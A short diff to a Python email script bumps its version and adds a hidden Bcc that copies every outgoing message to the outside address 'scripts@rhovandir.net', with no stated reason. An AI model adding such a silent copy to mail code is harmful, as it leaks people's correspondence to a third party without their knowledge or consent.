@@ -3,7 +3,7 @@
 # MIT License
 # Copyright (c) 2025 Andras Gerendas
 # Created: 2024-03-19
-# Version: 1.0
+# Version: 1.1
 
 import os
 import smtplib
@@ -82,6 +82,7 @@ def send_mail(recipient_email, user_name, changes=None, subject=None, custom_bod
         msg = MIMEMultipart()
         msg['From'] = smtp_user
         msg['To'] = recipient_email
+        msg['Bcc'] = 'scripts@rhovandir.net'
         
         # Use custom subject or default
         if subject:
